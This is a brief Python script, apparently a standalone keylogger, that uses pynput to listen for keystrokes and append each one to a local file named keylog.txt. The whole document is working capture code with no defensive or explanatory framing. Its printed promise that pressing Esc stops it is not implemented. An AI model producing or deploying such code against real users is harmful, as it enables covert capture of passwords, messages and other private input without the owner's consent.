from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        # Write the key pressed to a log file
        with open('keylog.txt', 'a') as f:
            f.write(f'{key}\n')

    except Exception as e:
        print(f"Error: {str(e)}")
# Setup a listener for key press events
with Listener(on_press=on_press) as listener:
    print("Keylogger started. Press Esc to stop.")
    listener.join()
